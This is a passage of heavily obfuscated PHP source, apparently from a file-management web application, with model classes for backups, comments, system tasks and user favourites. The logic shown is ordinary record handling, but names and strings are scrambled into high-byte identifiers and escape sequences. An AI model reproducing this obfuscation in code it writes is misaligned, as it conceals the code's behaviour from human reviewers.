Action($Ô—«Ğ• [1876])->taskInit(); Model($Ô—«Ğ• [1630])->cacheClear(); $ø‚è°”î = $Ô—«Ğ• [1877]; $–Ğ”ÛèÁ = Model($Ô—«Ğ• [1878])->findByKey($Ô—«Ğ• [1649], $ø‚è°”î); if (!$–Ğ”ÛèÁ) { $–Ğ”ÛèÁ = array(); } if (isset($–Ğ”ÛèÁ[$Ô—«Ğ• [180]])) { $–Ğ”ÛèÁ[$Ô—«Ğ• [180]] = json_decode($–Ğ”ÛèÁ[$Ô—«Ğ• [180]], !0); } if (isset($‹ÌÆï½°[$Ô—«Ğ• [180]])) { $–Ğ”ÛèÁ[$Ô—«Ğ• [180]][$Ô—«Ğ• [1634]] = $‹ÌÆï½°[$Ô—«Ğ• [180]]; unset($‹ÌÆï½°[$Ô—«Ğ• [180]]); } return array_merge($–Ğ”ÛèÁ, $‹ÌÆï½°); } public function listData($ºı„­ = false, $Ó›“®îî = "\x6d\x6f\x64\x69\x66\171\x54\x69\x6d\145", $ùÒ¤ ”Ğ = false) { return parent::listData($ºı„­, $Ó›“®îî, !0); } public function lastItem() { $®±½š¸ù = $this->listData(); return !empty($®±½š¸ù[0]) ? $®±½š¸ù[0] : null; } public function kill($ÄË†œªƒ) { $ê‡œ†ë =& $_SERVER[¡“ËÌ§œ]; $–¾Âõ°Ä = $this->listData($ÄË†œªƒ); if (!$–¾Âõ°Ä || empty($–¾Âõ°Ä[$ê‡œ†ë[32]])) { return !0; } Task::kill($ê‡œ†ë[799]); Task::kill($ê‡œ†ë[820]); Task::kill($ê‡œ†ë[829]); $íÌ±ˆ¸ü = $–¾Âõ°Ä[$ê‡œ†ë[32]]; $Õ×öî½ = TEMP_FILES . $ê‡œ†ë[798] . $íÌ±ˆ¸ü . $ê‡œ†ë[8]; IO::remove($Õ×öî½, !1); return $this->remove($ÄË†œªƒ); } public function remove($ä¼óœó¶) { $ÄÂÉ“¬ = $this->listData($ä¼óœó¶); if (!$ÄÂÉ“¬) { return !0; } return $this->backupRemove($ÄÂÉ“¬); } private function backupRemove($¨“Ÿ…Œ) { parent::remove($¨“Ÿ…Œ[$_SERVER[¡“ËÌ§œ][437]]); $‘âşå—› = $this->backupPath($¨“Ÿ…Œ); IO::remove($‘âşå—›, !1); return !0; } private function backupPath($°Ú÷ß÷É) { $£©İÄÊá =& $_SERVER[¡“ËÌ§œ]; $¸£ ¦ÂÈ = $°Ú÷ß÷É[$£©İÄÊá[32]]; $ÚÆîÉ¶´ = Model($£©İÄÊá[790])->get($£©İÄÊá[791]); $€´¹¥Ò› = substr(md5($£©İÄÊá[792] . $ÚÆîÉ¶´ . $¸£ ¦ÂÈ), 0, 8); return "\173\x69\157\72{$°Ú÷ß÷É[$£©İÄÊá[771]]}\x7d\x2f\144\x61\x74\x61\142\141\163\145\57\x62\141\x63\153\x75\160\57" . $¸£ ¦ÂÈ . $£©İÄÊá[11] . $€´¹¥Ò›; } public function start() { $¢†ëŞ›³ =& $_SERVER[¡“ËÌ§œ]; if ($GLOBALS[$¢†ëŞ›³[6]][$¢†ëŞ›³[89]][$¢†ëŞ›³[1879]] != $¢†ëŞ›³[88]) { return !0; } $Ó­çä‘Á = $this->config(); if (!$Ó­çä‘Á || $Ó­çä‘Á[$¢†ëŞ›³[1631]] != $¢†ëŞ›³[88]) { return !1; } $Óƒ‡‡‹Õ = $this->process(); foreach ($Óƒ‡‡‹Õ as $ÕÆÁÓã) { if ($ÕÆÁÓã) { return Task::restart($ÕÆÁÓã[$¢†ëŞ›³[437]]); } } $’¹ÙŸĞ» = new Backup(); $„ÖãöÅ¾ = $’¹ÙŸĞ»->db(); if ($„ÖãöÅ¾) { $„ÖãöÅ¾ = $’¹ÙŸĞ»->dbFile(); if ($„ÖãöÅ¾ && $Ó­çä‘Á[$¢†ëŞ›³[774]] == $¢†ëŞ›³[198]) { $„ÖãöÅ¾ = $’¹ÙŸĞ»->file(); } } Backup::set(array($¢†ëŞ›³[770] => 1, $¢†ëŞ›³[781] => time())); return !0; } public function process() { $ËÒƒİ‹Í =& $_SERVER[¡“ËÌ§œ]; $±Üšğßß = array($ËÒƒİ‹Í[777] => Task::get($ËÒƒİ‹Í[799]), $ËÒƒİ‹Í[782] => Task::get($ËÒƒİ‹Í[820]), $ËÒƒİ‹Í[200] => Task::get($ËÒƒİ‹Í[829])); $ãˆ¹µ‘ = !1; foreach ($±Üšğßß as &$ˆË‚‹‰) { if ($ãˆ¹µ‘) { $ˆË‚‹‰ = !1; continue; } if ($ˆË‚‹‰) { $ô´¼Äùª = intval(_get($ˆË‚‹‰, $ËÒƒİ‹Í[1666], 0)); if (time() - $ô´¼Äùª > 7200) { Task::kill($ˆË‚‹‰[$ËÒƒİ‹Í[437]]); $ãˆ¹µ‘ = !0; $ˆË‚‹‰ = !1; } } } return $±Üšğßß; } public function restore() { $Š–¢¡ùÑ =& $_SERVER[¡“ËÌ§œ]; ActionCall($Š–¢¡ùÑ[1080], !0, 1); ActionCall($Š–¢¡ùÑ[1080], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\145\x6e\x74"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\141\155\x65" => "\x63\157\155\x6d\x65\x6e\x74\137\x6d\x65\164\141", "\x6d\145\x74\x61\106\x69\x65\x6c\144" => "\x63\x6f\x6d\x6d\x65\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($‡½Ò‘Ô¢) { $£×âÓÈı =& $_SERVER[¡“ËÌ§œ]; if ($‡½Ò‘Ô¢[$£×âÓÈı[1880]]) { $µ¦Ë–Ë = $this->where(array($£×âÓÈı[1881] => $‡½Ò‘Ô¢[$£×âÓÈı[1880]]))->find(); if (!$µ¦Ë–Ë || $µ¦Ë–Ë[$£×âÓÈı[449]] != $‡½Ò‘Ô¢[$£×âÓÈı[449]] || $µ¦Ë–Ë[$£×âÓÈı[534]] != $‡½Ò‘Ô¢[$£×âÓÈı[534]]) { return !1; } $this->where(array($£×âÓÈı[1881] => $‡½Ò‘Ô¢[$£×âÓÈı[1880]]))->setAdd($£×âÓÈı[1882], 1); } $‡½Ò‘Ô¢[$£×âÓÈı[1883]] = 0; $‡½Ò‘Ô¢[$£×âÓÈı[1882]] = 0; $‡½Ò‘Ô¢[$£×âÓÈı[770]] = 1; return $this->add($‡½Ò‘Ô¢); } public function commentCount($íÉ „×é, $ªƒÔ ó, $‘ğœÙœç = false) { $ÂûË¶Å“ =& $_SERVER[¡“ËÌ§œ]; if (!$íÉ „×é) { return array(); } if (is_string($íÉ „×é) || is_int($íÉ „×é)) { $íÉ „×é = array($íÉ „×é); } $şìÓÔÆ· = array($ÂûË¶Å“[534], $ÂûË¶Å“[1884] => $ÂûË¶Å“[529]); $çÚ±â¸¹ = array($ÂûË¶Å“[534] => array($ÂûË¶Å“[7], $íÉ „×é), $ÂûË¶Å“[449] => $ªƒÔ ó); if ($‘ğœÙœç) { $çÚ±â¸¹[$ÂûË¶Å“[1661]] = $‘ğœÙœç; } $„ØÓ–…ß = $this->field($şìÓÔÆ·)->where($çÚ±â¸¹)->group($ÂûË¶Å“[534])->select(); return array_to_keyvalue($„ØÓ–…ß, $ÂûË¶Å“[534], $ÂûË¶Å“[529]); } public function starTarget($ûõºÙıŸ, $€æŞç‰˜) { $ÒÙÂ¨½³ =& $_SERVER[¡“ËÌ§œ]; $÷µÇè = $ûõºÙıŸ + self::TYPE_STAR_OFFSET; $‘ñÓœ³ = array($ÒÙÂ¨½³[1661] => USER_ID, $ÒÙÂ¨½³[449] => $÷µÇè, $ÒÙÂ¨½³[534] => $€æŞç‰˜); $±şÒØşµ = $this->where($‘ñÓœ³)->find(); if ($±şÒØşµ) { return $this->where(array($ÒÙÂ¨½³[437] => $±şÒØşµ[$ÒÙÂ¨½³[437]]))->delete(); } $çãòã¯ = array($ÒÙÂ¨½³[1880] => 0, $ÒÙÂ¨½³[1661] => USER_ID, $ÒÙÂ¨½³[770] => 1, $ÒÙÂ¨½³[774] => $ÒÙÂ¨½³[12], $ÒÙÂ¨½³[449] => $÷µÇè, $ÒÙÂ¨½³[534] => $€æŞç‰˜, $ÒÙÂ¨½³[1883] => 0, $ÒÙÂ¨½³[1882] => 0); return $this->add($çãòã¯); } public function starTargetCount($èÈ÷¦‹Ë, $¸ºª‹œÒ) { $¼²ãéõ =& $_SERVER[¡“ËÌ§œ]; $Ší«¢ãÓ = $¸ºª‹œÒ + self::TYPE_STAR_OFFSET; $®ˆ§ò× = $this->commentCount($èÈ÷¦‹Ë, $Ší«¢ãÓ); $ù×å¶ = $this->commentCount($èÈ÷¦‹Ë, $Ší«¢ãÓ, USER_ID); return array($¼²ãéõ[1885] => $®ˆ§ò×, $¼²ãéõ[1886] => $ù×å¶); } public function starTargetUserList($şÅ¿°€ƒ, $ÛÌâÙ³) { $†¯¸®¿ø =& $_SERVER[¡“ËÌ§œ]; $‘ìÁü·Ï = $şÅ¿°€ƒ + self::TYPE_STAR_OFFSET; $ğ³ÓüÖÀ = array($†¯¸®¿ø[534] => $ÛÌâÙ³, $†¯¸®¿ø[449] => $‘ìÁü·Ï); $úñãƒİ = $this->where($ğ³ÓüÖÀ)->count(); $Œ›ñÜ¦ = array($†¯¸®¿ø[284] => $úñãƒİ, $†¯¸®¿ø[1887] => array()); if (!$úñãƒİ) { return $Œ›ñÜ¦; } $ùÒ­Ñ´Ä = $this->field($†¯¸®¿ø[1661])->where($ğ³ÓüÖÀ)->limit(500)->select(); $ùÒ­Ñ´Ä = array_to_keyvalue($ùÒ­Ñ´Ä, $†¯¸®¿ø[12], $†¯¸®¿ø[1661]); $Œ›ñÜ¦[$†¯¸®¿ø[1887]] = Model($†¯¸®¿ø[542])->userListInfo($ùÒ­Ñ´Ä); return $Œ›ñÜ¦; } public function prasiseUserList($—„±ÈèÍ) { $Àâ‡êãğ =& $_SERVER[¡“ËÌ§œ]; $–Ğ©¯ñ¯ = array($Àâ‡êãğ[1888] => $—„±ÈèÍ); $ˆ„ŸÜŒ¨ = $this->where($–Ğ©¯ñ¯)->find(); $ş¡“ĞéË = _get($ˆ„ŸÜŒ¨, $Àâ‡êãğ[1883], 0); $—ı‹“äÀ = array($Àâ‡êãğ[284] => $ş¡“ĞéË, $Àâ‡êãğ[1887] => array()); if (!$ş¡“ĞéË) { return $—ı‹“äÀ; } $Õ³Ã‡£¾ = Model($Àâ‡êãğ[1889])->field($Àâ‡êãğ[1661])->where($–Ğ©¯ñ¯)->limit(500)->select(); $Õ³Ã‡£¾ = array_to_keyvalue($Õ³Ã‡£¾, $Àâ‡êãğ[12], $Àâ‡êãğ[1661]); $—ı‹“äÀ[$Àâ‡êãğ[1887]] = Model($Àâ‡êãğ[542])->userListInfo($Õ³Ã‡£¾); return $—ı‹“äÀ; } public function remove($ä¦ì©·) { $‹üùõĞï =& $_SERVER[¡“ËÌ§œ]; $ ÌÓÊÜå = array($‹üùõĞï[1881] => $ä¦ì©·); $Ëˆ”Œ¼ = $this->where($ ÌÓÊÜå)->find(); if ($Ëˆ”Œ¼[$‹üùõĞï[1880]]) { $this->where(array($‹üùõĞï[1881] => $Ëˆ”Œ¼[$‹üùõĞï[1880]]))->setAdd($‹üùõĞï[1882], -1); } return $this->where($ ÌÓÊÜå)->delete(); } public function edit($ñœıëª˜, $ö‚Ï›óç) { $òÊ‹Ñä€ =& $_SERVER[¡“ËÌ§œ]; $ñªª£• = array($òÊ‹Ñä€[1881] => $ñœıëª˜); return $this->where($ñªª£•)->save(array($òÊ‹Ñä€[1890] => $ö‚Ï›óç)); } public function prasise($»ùÑ‡Õ«) { $ßœ†£¥ =& $_SERVER[¡“ËÌ§œ]; $áÓ©É = Model($ßœ†£¥[1891]); $Š†Ù¾Ú = array($ßœ†£¥[1881] => $»ùÑ‡Õ«, $ßœ†£¥[1652] => USER_ID); $Ÿå¯¼¦ = $áÓ©É->where($Š†Ù¾Ú)->find(); if (!$Ÿå¯¼¦) { $áÓ©É->add($Š†Ù¾Ú); $Åş‚÷› = $this->where(array($ßœ†£¥[1881] => $»ùÑ‡Õ«))->setAdd($ßœ†£¥[1883], 1); } else { $áÓ©É->where($Š†Ù¾Ú)->delete(); $Åş‚÷› = $this->where(array($ßœ†£¥[1881] => $»ùÑ‡Õ«))->setAdd($ßœ†£¥[1883], -1); } return $Åş‚÷›; } public function targetInfo($´Ìè¬, $¤‡áïªø) { $õä§ »Ì =& $_SERVER[¡“ËÌ§œ]; $Ô¢öõ×‰ = array($õä§ »Ì[614] => $´Ìè¬, $õä§ »Ì[615] => $¤‡áïªø); $‹ØÃ¬Ğ = $this->where($Ô¢öõ×‰)->count(); $ñò¬Íç¹ = "\122\x49\x47\110\x54\x20\112\x4f\111\116\40{$this->tablePrefix}\143\157\155\155\x65\x6e\x74\137\160\162\141\151\x73\145\40\163\164\141\162\x20\x6f\156\x20\143\157\x6d\155\x65\156\164\x2e\143\x6f\155\155\145\156\x74\x49\x44\40\x3d\x20\163\164\141\162\56\143\157\x6d\155\x65\156\x74\x49\104"; $—©ó—Ï£ = $this->alias($õä§ »Ì[383])->where($Ô¢öõ×‰)->join($ñò¬Íç¹, $õä§ »Ì[1892])->count(); $†Ùããü“ = array($õä§ »Ì[1893] => $‹ØÃ¬Ğ, $õä§ »Ì[1894] => $—©ó—Ï£); return $†Ùããü“; } public function listData($›÷ş½Î£) { $­óÅ¿Ûú =& $_SERVER[¡“ËÌ§œ]; if (isset($›÷ş½Î£[$­óÅ¿Ûú[1895]])) { if ($›÷ş½Î£[$­óÅ¿Ûú[1895]]) { $›÷ş½Î£[$­óÅ¿Ûú[1888]] = array($­óÅ¿Ûú[1034], intval($›÷ş½Î£[$­óÅ¿Ûú[1895]])); } unset($›÷ş½Î£[$­óÅ¿Ûú[1895]]); } if (isset($›÷ş½Î£[$­óÅ¿Ûú[1896]])) { if ($›÷ş½Î£[$­óÅ¿Ûú[1896]]) { $›÷ş½Î£[$­óÅ¿Ûú[1888]] = array($­óÅ¿Ûú[1031], intval($›÷ş½Î£[$­óÅ¿Ûú[1896]])); } unset($›÷ş½Î£[$­óÅ¿Ûú[1896]]); } return $this->_listData($›÷ş½Î£); } private function _listData($ŸºÌãŒ) { $º‰œ”ğí =& $_SERVER[¡“ËÌ§œ]; $»è¼åç— = $this->where($ŸºÌãŒ)->_makeOrder()->selectPage(100); $this->_listAppendParent($»è¼åç—[$º‰œ”ğí[398]]); $this->_listAppendUser($»è¼åç—[$º‰œ”ğí[398]]); $this->_listAppendMeta($»è¼åç—[$º‰œ”ğí[398]]); return $»è¼åç—; } private function _makeOrder() { $¿øÔ‹Õ· =& $_SERVER[¡“ËÌ§œ]; $ó€ÓÓÁÍ = array($¿øÔ‹Õ·[1883], $¿øÔ‹Õ·[1882], $¿øÔ‹Õ·[201]); $£¹¸ûäå = Input::get($¿øÔ‹Õ·[495], $¿øÔ‹Õ·[7], $¿øÔ‹Õ·[461], $ó€ÓÓÁÍ); $Ö×º¾ßÔ = Input::get($¿øÔ‹Õ·[496], $¿øÔ‹Õ·[7], $¿øÔ‹Õ·[1654], array($¿øÔ‹Õ·[1897], $¿øÔ‹Õ·[491])); $‰Œ¦¿‚ = $£¹¸ûäå . $¿øÔ‹Õ·[53] . $Ö×º¾ßÔ; return $this->order($‰Œ¦¿‚); } private function _listAppendParent(&$Ë±¥Î©) { $Œ¨œ€å =& $_SERVER[¡“ËÌ§œ]; $éÏİ ¦ = array_unique(array_to_keyvalue($Ë±¥Î©, $Œ¨œ€å[12], $Œ¨œ€å[1880])); $éÏİ ¦ = array_remove_value($éÏİ ¦, $Œ¨œ€å[198]); if (!$éÏİ ¦) { return; } $‰Ìñş°´ = $this->where(array($Œ¨œ€å[1881] => array($Œ¨œ€å[7], $éÏİ ¦)))->select(); $‰Ìñş°´ = array_to_keyvalue($‰Ìñş°´, $Œ¨œ€å[1888]); foreach ($Ë±¥Î© as &$®ó—Åò¥) { if (isset($‰Ìñş°´[$®ó—Åò¥[$Œ¨œ€å[1880]]])) { $®ó—Åò¥[$Œ¨œ€å[1898]] = $‰Ìñş°´[$®ó—Åò¥[$Œ¨œ€å[1880]]]; } } unset($®ó—Åò¥); } private function _listAppendUser(&$äˆ©÷ø) { $®ÜÑëö¥ =& $_SERVER[¡“ËÌ§œ]; $ÎÑÂİšÎ = array_unique(array_to_keyvalue($äˆ©÷ø, $®ÜÑëö¥[12], $®ÜÑëö¥[1661])); $ÎÑÂİšÎ = array_remove_value($ÎÑÂİšÎ, $®ÜÑëö¥[198]); if (count($ÎÑÂİšÎ) == 0) { return; } foreach ($äˆ©÷ø as $®±Ô‚») { if (isset($®±Ô‚»[$®ÜÑëö¥[1898]])) { $ÎÑÂİšÎ[] = $®±Ô‚»[$®ÜÑëö¥[1898]][$®ÜÑëö¥[1661]]; } } $»È¨ = Model($®ÜÑëö¥[563])->userListInfo($ÎÑÂİšÎ); foreach ($äˆ©÷ø as &$®±Ô‚») { $®±Ô‚»[$®ÜÑëö¥[628]] = $»È¨[$®±Ô‚»[$®ÜÑëö¥[1661]]]; if (isset($®±Ô‚»[$®ÜÑëö¥[1898]])) { $®±Ô‚»[$®ÜÑëö¥[1898]][$®ÜÑëö¥[628]] = $»È¨[$®±Ô‚»[$®ÜÑëö¥[1898]][$®ÜÑëö¥[1661]]]; } } unset($®±Ô‚»); } private function _listAppendMeta(&$Åê‡ë¼¥) { $˜õİÒõ» =& $_SERVER[¡“ËÌ§œ]; $ÏÍôÓ‘À = array_unique(array_to_keyvalue($Åê‡ë¼¥, $˜õİÒõ»[12], $˜õİÒõ»[1888])); $ÏÍôÓ‘À = array_remove_value($ÏÍôÓ‘À, $˜õİÒõ»[198]); if (!$ÏÍôÓ‘À) { return; } foreach ($Åê‡ë¼¥ as $ƒûÉ¢ïŸ) { if (isset($ƒûÉ¢ïŸ[$˜õİÒõ»[1898]])) { $ÏÍôÓ‘À[] = $ƒûÉ¢ïŸ[$˜õİÒõ»[1898]][$˜õİÒõ»[1888]]; } } $öÓíçª¹ = $this->metaList($ÏÍôÓ‘À); if (!$öÓíçª¹) { return !1; } foreach ($Åê‡ë¼¥ as &$ƒûÉ¢ïŸ) { $ƒûÉ¢ïŸ[$˜õİÒõ»[504]] = $öÓíçª¹[$ƒûÉ¢ïŸ[$˜õİÒõ»[1888]]]; if (isset($ƒûÉ¢ïŸ[$˜õİÒõ»[1898]])) { $ƒûÉ¢ïŸ[$˜õİÒõ»[1898]][$˜õİÒõ»[504]] = $öÓíçª¹[$ƒûÉ¢ïŸ[$˜õİÒõ»[1898]][$˜õİÒõ»[1888]]]; } } unset($ƒûÉ¢ïŸ); } private function metaList($òˆ²Ú¥­) { $øóö°ÈÅ =& $_SERVER[¡“ËÌ§œ]; if (!$òˆ²Ú¥­) { return array(); } $”ãÜå¸ = array($øóö°ÈÅ[1888] => array($øóö°ÈÅ[7], $òˆ²Ú¥­)); $”Á’Ï÷İ = Model($øóö°ÈÅ[1899])->where($”ãÜå¸)->select(); $”Á’Ï÷İ = array_to_keyvalue_group($”Á’Ï÷İ, $øóö°ÈÅ[1888]); foreach ($”Á’Ï÷İ as $—”ŞÌ¡¬ => $ÙöÊåŠ¦) { $õãÕ›ñç = array(); foreach ($ÙöÊåŠ¦ as $Ÿ¬ö¸äİ) { $õãÕ›ñç[$Ÿ¬ö¸äİ[$øóö°ÈÅ[94]]] = $Ÿ¬ö¸äİ[$øóö°ÈÅ[403]]; } $”Á’Ï÷İ[$—”ŞÌ¡¬] = $õãÕ›ñç; } return $”Á’Ï÷İ ? $”Á’Ï÷İ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\x6c\x65\x5f\143\157\156\164\145\x6e\164\163"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\151\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\x73\145\x72\164", "\146\165\156\x63\164\x69\157\156")); } goto DÇ†–‘äê–; c¢ˆÊ»³Ãí: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\164\x61\163\x6b\114\x69\x73\164"; public $field = array("\x6e\141\x6d\x65", "\164\171\x70\145", "\x65\166\x65\156\164", "\164\x69\x6d\x65", "\x64\145\163\x63", "\x73\171\163\x74\145\155", "\x65\x6e\141\142\x6c\x65", "\154\141\x73\x74\122\x75\156", "\x73\157\162\x74"); public function listData($¨•¬Ü = false, $ãÔî»ô = "\163\157\x72\164", $¤òÅÊÇÊ = false) { return parent::listData($¨•¬Ü, $ãÔî»ô, $¤òÅÊÇÊ); } public function add($¾š ¶¤Ö) { $üäÅò±ş =& $_SERVER[¡“ËÌ§œ]; $­Å¥è³ = $this->findByName($¾š ¶¤Ö[$üäÅò±ş[32]]); if ($­Å¥è³) { return !1; } $¾š ¶¤Ö[$üäÅò±ş[1619]] = 0; $¾š ¶¤Ö[$üäÅò±ş[1875]] = $this->getSort(); return parent::insert($¾š ¶¤Ö); } private function getSort() { $ïÏ€ŞÔÎ =& $_SERVER[¡“ËÌ§œ]; $¨†â¦Œ• = parent::listData(); $”¨¿ñ¢ = array_to_keyvalue($¨†â¦Œ•, $ïÏ€ŞÔÎ[12], $ïÏ€ŞÔÎ[1875]); return empty($”¨¿ñ¢) ? 0 : max($”¨¿ñ¢) + 1; } public function update($‚–¹™€Ï, $…›‰€Ÿ„) { $ÆåçêÛ× =& $_SERVER[¡“ËÌ§œ]; $Úôõ·±Ú = $this->listData($‚–¹™€Ï); $¾¨ëûñ„ = $this->findByName($…›‰€Ÿ„[$ÆåçêÛ×[32]]); if (!$Úôõ·±Ú || $¾¨ëûñ„ && $¾¨ëûñ„[$ÆåçêÛ×[437]] != $Úôõ·±Ú[$ÆåçêÛ×[437]]) { return !1; } return parent::update($‚–¹™€Ï, $…›‰€Ÿ„); } public function remove($Ğ„è¤¾Â, $ËŸ¡›îå = false) { $µ…ƒŸµÑ =& $_SERVER[¡“ËÌ§œ]; $ºó†ÖñÌ = $this->listData($Ğ„è¤¾Â); if (!$ºó†ÖñÌ) { return; } if (!$ËŸ¡›îå && $ºó†ÖñÌ[$µ…ƒŸµÑ[1307]] == $µ…ƒŸµÑ[88]) { return !1; } return parent::remove($Ğ„è¤¾Â); } public function enable($şêÚçéß, $å¡êşÆÙ) { return $this->update($şêÚçéß, array($_SERVER[¡“ËÌ§œ][2285] => $å¡êşÆÙ)); } public function run($©à½Ş«Â) { return $this->update($©à½Ş«Â, array($_SERVER[¡“ËÌ§œ][2297] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($¡ü±×Ïû) { $¡Î•Ôå =& $_SERVER[¡“ËÌ§œ]; return array($¡Î•Ôå[1962] => array(USER_ID, $¡Î•Ôå[2298])); } protected function listData() { $Ñ€èÄ²à =& $_SERVER[¡“ËÌ§œ]; $æãğ˜òê = array($Ñ€èÄ²à[1652] => USER_ID, $Ñ€èÄ²à[521] => 0); $®®Â¬êß = $Ñ€èÄ²à[2299]; $­¹î­Ù = $this->field($®®Â¬êß)->where($æãğ˜òê)->order($Ñ€èÄ²à[2300])->select(); return $­¹î­Ù ? $­¹î­Ù : array(); } protected function resetCache() { } protected function listView() { $È¡÷«­Ë =& $_SERVER[¡“ËÌ§œ]; $‰¾Õˆ´° = $this->listData(); $¶™øÌ = array_filter_by_field($‰¾Õˆ´°, $È¡÷«­Ë[33], $È¡÷«­Ë[454]); $Ï‘·ùÚ = array_to_keyvalue($¶™øÌ, $È¡÷«­Ë[12], $È¡÷«­Ë[84]); if (!$Ï‘·ùÚ) { return $‰¾Õˆ´°; } $»‚Ò„–Î = 2000; $üüÂÔ§À = array($È¡÷«­Ë[455] => array($È¡÷«­Ë[456], $Ï‘·ùÚ)); $¬ö‡¬¥× = Model($È¡÷«­Ë[845])->listSource($üüÂÔ§À, $»‚Ò„–Î); $¬ö‡¬¥× = array_merge($¬ö‡¬¥×[$È¡÷«­Ë[83]], $¬ö‡¬¥×[$È¡÷«­Ë[82]]); $¬ö‡¬¥× = array_to_keyvalue($¬ö‡¬¥×, $È¡÷«­Ë[440]); foreach ($‰¾Õˆ´° as $åªµ => $ÎØ¯ëÉ…) { $®­ˆı—Â = $¬ö‡¬¥×[$ÎØ¯ëÉ…[$È¡÷«­Ë[84]]]; $®­ˆı—Â = $®­ˆı—Â ? $®­ˆı—Â : array(); $‰¾Õˆ´°[$åªµ] = array_merge($®­ˆı—Â, $ÎØ¯ëÉ…); } return $‰¾Õˆ´°; } protected function addFav($Öşï„Ã÷, $ÕŒàÌ‘ˆ = '', $ğš¶¥Ã = "\x73\x6f\165\x72\143\145") { $–“×¨˜Ì =& $_SERVER[¡“ËÌ§œ]; $´è½¦Ûõ = array($–“×¨˜Ì[1652] => USER_ID, $–“×¨˜Ì[521] => 0, $–“×¨˜Ì[460] => $ğš¶¥Ã, $–“×¨˜Ì[459] => $Öşï„Ã÷); if ($this->where($´è½¦Ûõ)->find()) { return !1; } $´è½¦Ûõ = array($–“×¨˜Ì[1652] => USER_ID, $–“×¨˜Ì[521] => 0); $–’ó§õ = $this->where($´è½¦Ûõ)->max($–“×¨˜Ì[1875]); if (!$–’ó§õ) { $–’ó§õ = 0; } if (!$ÕŒàÌ‘ˆ && $ğš¶¥Ã == $–“×¨˜Ì[454]) { $æ«„®— = Model($–“×¨˜Ì[1353])->where(array($–“×¨˜Ì[455] => $Öşï„Ã÷))->find(); if (!$æ«„®—) { return !1; } $ÕŒàÌ‘ˆ = $æ«„®—[$–“×¨˜Ì[32]]; } $ÕŒàÌ‘ˆ = $this->getAutoName($ÕŒàÌ‘ˆ); $æÎ§Ú‚ç = array($–“×¨˜Ì[1652] => USER_ID, $–“×¨˜Ì[521] => 0, $–“×¨˜Ì[458] => $ÕŒàÌ‘ˆ, $–“×¨˜Ì[459] => $Öşï„Ã÷, $–“×¨˜Ì[460] => $ğš¶¥Ã, $–“×¨˜Ì[1855] => $–’ó§õ + 1); return $this->add($æÎ§Ú‚ç); } protected function remove($èóò‘ÁÇ) { $ÑŞÆ‡¤ =& $_SERVER[¡“ËÌ§œ]; $–ëÇøÔ = array($ÑŞÆ‡¤[1652] => USER_ID, $ÑŞÆ‡¤[457] => $èóò‘ÁÇ); return $this->where($–ëÇøÔ)->delete(); } protected function removeByName($³û’«») { $„†ºÊü³ =& $_SERVER[¡“ËÌ§œ]; $„ƒıÄ‡Ù = array($„†ºÊü³[1652] => USER_ID, $„†ºÊü³[458] => $³û’«», $„†ºÊü³[521] => 0); return $this->where($„ƒıÄ‡Ù)->delete(); } protected function rename($‡Ü¾ô»ó, $Ê§”ä‹ù) { $×ûÚ¾œ =& $_SERVER[¡“ËÌ§œ]; if ($‡Ü¾ô»ó == $Ê§”ä‹ù) { return !1; } $İ÷†Ü±â = $this->getAutoName($Ê§”ä‹ù); if ($Ê§”ä‹ù != $İ÷†Ü±â) { return !1; } $Åª¾»Ï« = array($×ûÚ¾œ[1652] => USER_ID, $×ûÚ¾œ[521] => 0, $×ûÚ¾œ[32] => $‡Ü¾ô»ó); return $this->where($Åª¾»Ï«)->save(array($×ûÚ¾œ[32] => $Ê§”ä‹ù)); } protected function resetSort($¬¼ŞóË™) { $ı½¶¨ã­ =& $_SERVER[¡“ËÌ§œ]; $¬¼ŞóË™ = is_array($¬¼ŞóË™) ? $¬¼ŞóË™ : array(); $€Õ¿ìŞ™ = array($ı½¶¨ã­[1652] => USER_ID); for ($ë©­Šã› = 0; $ë©­Šã› < count($¬¼ŞóË™); $ë©­Šã›++) { $€Õ¿ìŞ™[$ı½¶¨ã­[457]] = $¬¼ŞóË™[$ë©­Šã›]; $this->where($€Õ¿ìŞ™)->save(array($ı½¶¨ã­[1855] => $ë©­Šã› + 1)); } return !0; } protected function moveTop($ù½şĞŸ«) { $ï¤Í’ =& $_SERVER[¡“ËÌ§œ]; $Åæ’¬¾Ù = array($ï¤Í’[1652] => USER_ID, $ï¤Í’[521] => 0); $æ¿®¦Ä = $this->where($Åæ’¬¾Ù)->where(array($ï¤Í’[32] => $ù½şĞŸ«))->find(); if (!$æ¿®¦Ä) { return; } $¸Õ¬Ò¤¢ = $this->field($ï¤Í’[437])->where($Åæ’¬¾Ù)->order($ï¤Í’[2300])->select(); $¸Õ¬Ò¤¢ = array_to_keyvalue($¸Õ¬Ò¤¢, $ï¤Í’[12], $ï¤Í’[437]); $ªåß²Şù = $¸Õ¬Ò¤¢; $¸Õ¬Ò¤¢ = array_remove_value($¸Õ¬Ò¤¢, $æ¿®¦Ä[$ï¤Í’[437]]); array_unshift($¸Õ¬Ò¤¢, $æ¿®¦Ä[$ï¤Í’[437]]); return $this->resetSort($¸Õ¬Ò¤¢); } protected function moveBottom($¦ÃÑ×¬) { $‡†ê×Ä¤ =& $_SERVER[¡“ËÌ§œ]; $…üš­ƒÖ = array($‡†ê×Ä¤[1652] => USER_ID, $‡†ê×Ä¤[521] => 0); $°±ê¸İ± = $this->where($…üš­ƒÖ)->max($‡†ê×Ä¤[1875]); $ŞŞœó¹™ = array($‡†ê×Ä¤[1875] => $°±ê¸İ± + 1); return $this->where($…üš­ƒÖ)->where(array($‡†ê×Ä¤[32] => $¦ÃÑ×¬))->save($ŞŞœó¹™); } private function getAutoName($¦®Å„ÉÃ) { $¿ó™®¤ =& $_SERVER[¡“ËÌ§œ]; $’…÷ªâ = array($¿ó™®¤[1652] => USER_ID, $¿ó™®¤[521] 